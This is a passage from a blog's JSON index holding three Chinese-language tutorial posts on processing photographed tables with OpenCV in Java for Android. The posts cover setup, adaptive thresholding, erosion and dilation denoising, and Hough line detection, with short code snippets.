画直线使用Imgproc.line方法，最后两个参数依次是BGR三个通道的值组成的Scalar对象，代表直线的颜色，以及画出的直线的宽度（以像素为单位）。 效果最后用Imgcodecs.imwrite将Mat写入文件就可以看到最终的效果了，在测试的时候尤其有用。 也可以把blockImages中的图输出出来看结果，因为做的时候没存档，所以只能用之后的图来说明一下了： 请忽略图中的红线，为之后的步骤绘制出来的，左右不完整是因为我设置了百分之二十的左右的PADDING，为了方便后面的找线与切割。 当然在找直线的过程中也可以把找到的图片打印出来感觉一下效果，下面分别是调试前出的图和最终参数调试后出来的图： 调试前： 调试后：","tags":[{"name":"Java","slug":"Java","permalink":"http://www.viseator.com/tags/Java/"},{"name":"OpenCV","slug":"OpenCV","permalink":"http://www.viseator.com/tags/OpenCV/"}]},{"title":"OpenCV处理拍照表格（二）","date":"2016-12-02T08:58:12.000Z","path":"2016/12/02/OpenCV处理拍照表格（二）/","text":"先来看看上次处理后的整张图片效果： 这里发现我将图片的颜色已经反相了，这是考虑到下一步的直接检测必须以白色像素为内容。做法在上一篇提到过，交换两段的位置就可以了。 可以看到噪点已经几乎没有了，文字的清晰度还是可以的。这里采用的kernel都是2x2的。 直线检测下面就是比较关键步骤——直线检测了。 首先介绍一下openCV提供的直线检测算法：霍夫变换。 霍夫变换是图像处理中一个著名的检测算法，用于对二值图片中特定的几何形状的检测，直线检测只是其中比较常见的一种用法。从holybin的专栏中复制一段介绍基本理论的内容： Hough直线检测的基本理论是二值图像中的任何点都可能是一些候选直线集合的一部分，所选的参数方式是每一行代表极坐标中的一个点，并且隐含的直线是通过象征点的，垂直于原点到此点的半径，即：检测的过程可以看成从图像中的一个个像素点出发，寻找每个点成为直线一部分的可能，再把这条线上可能的点连起来形成直线。在实际检测中，当一条线出现凹陷或是弯曲度时，也会检测出直线，只是不是一条完整长度直线，而是断断续续重叠相近的很多直线。&gt;而对于图像中的一条直线而言，利用直角坐标系，可以表示为：的形式。那么，该直线上任意一点（x,y）变换到k-b参数空间将变成一个“点”。也就是说，将图像空间中所有的非零像素转换到k-b参数空间，那么它们将聚焦在一个点上。如此一来，参数空间中的一个局部峰值点就很有可能对应着原图像空间中的一条直线。不过，由于直线的斜率可能为无穷大，或者无穷小，那么，在k-b参数空间就不便于对直线进行刻画和描述。所以，研究人员提出采用极坐标参数空间进行直线检测。在极坐标系中，直线可以表述为以下形式：&gt; 更为详细的分析可以看浅墨的博客 如果不能理解也没有关系，在openCV中已经为我们封装成了两个函数HoughLines( )与HoughLinesP( )，他们之间的区别在于算法的不同，而效果的差别不大，但HoughLinesP可以减少计算量，所以在这里我们采用了HoughLinesP来进行。1public static void HoughLinesP(Mat image,Mat lines,double rho,double theta,int threshold,double minLineLength,double maxLineGap) Finds line segments in a binary image using the probabilistic Hough transform. Parameters:image - 8-bit, single-channel binary source image. The image may be modified by the function.lines - Output vector of lines. Each line is represented by a 4-element vector (x_1, y_1, x_2, y_2), where (x_1,y_1) and (x_2, y_2) are the ending points of each detected line segment.rho - Distance resolution of the accumulator in pixels.theta - Angle resolution of the accumulator in radians.threshold - Accumulator threshold parameter. Only those lines are returned that get enough votes (&gt;threshold).minLineLength - Minimum line length. Line segments shorter than that are rejected.maxLineGap - Maximum allowed gap between points on the same line to link them. 解释一下各个参数： image:源图像 Mat格式，8位单通道（Cv_8UC1） lines: 输出的“图像” 虽然是Mat格式，但是其中保存的内容已经不再是图像了，其中的每行（Rows！在这里手上买到的一本书中写成了列，大概是因为版本不同导致的，因为这个在这里卡了好几个小时……）中储存了一个double[]，下面会讲到如何使用里面的信息。 rho：翻译过来是距离的解析度，以像素为单位，在后面这个参数起了大作用。 theta：与rho相似地，是角度的解析度，以弧度为单位。 threshold：阈值 这个值决定了霍夫变换后对于一对值投票所需达到的阈值才能被记录。换句话说，这个值越大，检测出直线的要求就越高（这个要求应该是对于直线上的点聚集程度的要求）。应为一个非负值。 minLineLength:字面意思，检测出的直线的最小长度，小于这个长度的直线将不会被记录。单位是像素。 maxLineGap：字面意思，检测时可以接受的直线断开的距离（实际情况中很难达到一条直线上的点全部都有，通常是断断续续的，这时这个值就发挥了很大的作用）。单位是像素。 可以看到这个函数的参数非常多，并且有个别参数并没有一个量化的标准（比如threshold在检测大图的时候取150左右的值比较好，但在后面检测小图时候设成0都不尽人意，rho与theta参数如果按照资料中普遍的1和2pi/180来设置小图的检测就会出现问题），更加悲惨的是这些参数之间存在相互影响，对实际的图片进行处理的过程中参数的差别可能很大，需要一些耐心和方法去慢慢调试（我写了嵌套的循环再输出所有的图用肉眼看效果再缩小范围……） 最影响最终效果的部分在于最后两个值的设置，可以看到上面我们将要处理的图片，这步我的目的是检测出所有的横向的表格边线。下面先上最终的效果图： (红线为最终检测出的直线位置） 具体的检测过程下一篇介绍。","tags":[{"name":"Java","slug":"Java","permalink":"http://www.viseator.com/tags/Java/"},{"name":"OpenCV","slug":"OpenCV","permalink":"http://www.viseator.com/tags/OpenCV/"}]},{"title":"OpenCV处理拍照表格（一）","date":"2016-11-15T13:09:28.000Z","path":"2016/11/15/OpenCV处理拍照表格（一）/","text":"环境配置https://www.learn2crack.com/2016/03/setup-opencv-sdk-android-studio.html 非常新的一篇在AS中安装OpenCV的教程，按教程装好了环境并测试通过。 注意教程中没有讲到的是想要使用OpenCV的相关功能，需要安装下载包中apk目录下的对应处理器的OpenCV manager。并在使用OpenCV的活动中加入以下内容：1234567891011121314151617private BaseLoaderCallback mLoaderCallback = new BaseLoaderCallback(this) &#123; //Connect to OpenCV manager service and initialize @Override public void onManagerConnected(int status) &#123; switch (status)&#123; case BaseLoaderCallback.SUCCESS: Log.i(TAG, \"OpenCV Success\"); break; default: super.onManagerConnected(status); Log.i(TAG, \"OpenCV Fail\"); break; &#125; &#125;&#125;; 1234567//Initialize at every resume@Overrideprotected void onResume() &#123; super.onResume(); OpenCVLoader.initAsync(OpenCVLoader.OPENCV_VERSION_3_1_0, getApplicationContext(), mLoaderCallback); Log.d(TAG, \"On Resume OK\");&#125; http://docs.opencv.org/java/3.1.0/&gt;opencv的官方文档。更正：上面的3.1版的文档并没有详细的方法解释！ 所以只能看 http://docs.opencv.org/java/2.4.11/ 2.4.11的。 处理的大致思路目前想到的思路是： 图像彩色转灰度 灰度图像设置阈值后二值化即变成完全黑白 去除多余的噪点 边缘识别 透视变形 矩形识别 分割识别出的矩形 OCR对矩形进行识别，读取数据。 实现灰度与二值化开始采用OpenCV中BitmapToMat方法，将文件以Bitmap的形式读取，再转换为Mat格式再进行处理。 后面发现了OpenCV自带的imread方法，传入文件路径和Mat的格式后就可以方便地获得一个Mat对象。 另外如果在这里采用Imgcodecs.CV_LOAD_IMAGE_GRAYSCALE标签，就可以直接以灰度的形式读取图像，省去了颜色转化的步骤。并且这个Mat的格式就是下面一步二值化要求传入的8UC1（8位单通道）格式。 下面就是二值化步骤，OpenCV提供了两个函数，第一个是普通的Threshold函数： thresholdpublic static double threshold(Mat src,Mat dst,double thresh,double maxval,int type) Parameters: src - input array (single-channel, 8-bit or 32-bit floating point). dst - output array of the same size and type as src. thresh - threshold value. maxval - maximum value to use with the THRESH_BINARY and THRESH_BINARY_INV thresholding types. type - thresholding type (see the details below). 传入图像，传出图像，阈值，填充的最深颜色，填充方法（达到阈值就填充最深颜色或相反），就可以根据每个像素的灰度值与阈值进行比较来决定填充的值为0或是最深。 定阈值的方法虽然可以对一张图像通过调整达到最优的效果，但是对于不同光照条件下拍摄出来的照片，因为整体亮度的不同，定阈值显然无法适应所有的情况。 所以就有了第二种函数，adaptiveThreshold，除了传入上面的这些参数外，增加了三个重要的参数 adaptiveThresholdpublic static void adaptiveThreshold(Mat src,Mat dst,double maxValue,int adaptiveMethod,int thresholdType,int blockSize,double C)Parameters:src - Source 8-bit single-channel image.dst - Destination image of the same size and the same type as src.maxValue - Non-zero value assigned to the pixels for which the condition is satisfied. See the details below.adaptiveMethod - Adaptive thresholding algorithm to use, ADAPTIVE_THRESH_MEAN_C or ADAPTIVE_THRESH_GAUSSIAN_C. See the details below.thresholdType - Thresholding type that must be either THRESH_BINARY or THRESH_BINARY_INV.blockSize - Size of a pixel neighborhood that is used to calculate a threshold value for the pixel: 3, 5, 7, and so on.C - Constant subtracted from the mean or weighted mean (see the details below). Normally, it is positive but may be zero or negative as well. blockSize：对某个像素周围进行采样的范围。adaptiveMethod：根据上面的范围求阈值的方法，有两种： mean平均，简单地取采样范围内的平均值作为阈值。 gaussian高斯，以高斯函数为基础，简单地说就是近的地方权重更高、远的地方权重低，来求阈值。 C：求出来的阈值减去的常量。 这三个参数就是决定二值化效果的关键，我找最优值的方法比较暴力，写了一个嵌套的循环设置这两个值，再输出到文件导出到电脑上用肉眼比较。最后确定的值为17-10。 adaptiveMethod我用的是mean，因为表格相对来说黑白比较明显，并不需要去根据距离的远近来决定阈值。 17这个值在我的手机拍摄出来的效果里面是最好的，但由于不同拍摄设备的分辨率不同，就造成了笔画所占据的像素的数量的不同，可以想到的是在高分辨率的情况下这个值应该要相应地增大，打个比方说我一个笔画的粗细就有17个像素，那么这个范围内检测出的阈值就会非常高从而导致笔画的残缺不全。 C这个值还是需要经过测试来得出的，设置的不同对最后效果的影响是最大的，直接会决定最后出来的图片是笔画过粗或是笔画残缺。 下面是处理前后的效果： 可以看到二值化以后的图像只有黑白两色，但是明显有许多的噪点。 去噪二值化之后就是去噪了，去噪的目的是把图像中的独立的点去掉。 去噪的方法是腐蚀，跟字面意思一样，就是缩小图案的范围，当图像的范围本身就很小时（噪点就是一个个这样的独立点），缩小后自然就不见了。 可以想到，在去噪后，部分笔画也随之缩小甚至细的地方会直接消失，所以腐蚀之后要再进行一步膨胀，即把图案的边缘扩大。 因为噪点已经消失，所以也不会因扩大而回来，但笔画依然存在，就会膨胀而得到弥补，也顺便可以补一下残缺的地方。 原理大概就是这样，但是由于OpenCV的这两个操作针对的是图像中的亮点（白色的地方被认为是亮点），而我们的表格又是白底黑字的，实际上黑色的部分是我们想要处理的部分，所以我将这两步交换了，相当于是对黑色的地方先腐蚀后膨胀。 下面是代码实现：123456Mat kernelDilate = Imgproc.getStructuringElement(Imgproc.MORPH_DILATE, new Size(2, 2));Imgproc.dilate(srcPic, srcPic, kernelDilate);Imgcodecs.imwrite(\"/storage/sdcard/pic/test/afterErode.jpg\", srcPic);Mat kernelErode = Imgproc.getStructuringElement(Imgproc.MORPH_ERODE, new Size(2, 2));Imgproc.erode(srcPic, srcPic, kernelErode);Imgcodecs.imwrite(\"/storage/sdcard/pic/test/afterDilate.jpg\", srcPic); 参数中有一个Kernel，这个就是处理图像的核，具体的内容不展开，我们利用getStructuringElement函数可以构建特定的处理核，这个函数第一个参数是构建的核的类型，除了用于代码中用到的膨胀和腐蚀的类型，还有ract、cross、ellipse等不同的形状，后面的size就是我们设置的重点了，指的是核的大小，可以理解成检测的范围，对于大的噪点自然需要大的范围，但是也意味着笔画细节丢失也更加严重。对于膨胀操作，则可以理解成膨胀的像素数，这个数值越大，最后的结果中的笔画也就越粗。 下面是上述代码的结果对比： 之前 设置了四种不同的参数，可以看到噪点基本都被去除，最后的细节不尽相同。","tags":[{"name":"Java","slug":"Java","permalink":"http://www.viseator.com/tags/Java/"},{"name":"OpenCV","slug":"OpenCV","permalink":"http://www.viseator.com/tags/OpenCV/"}]}]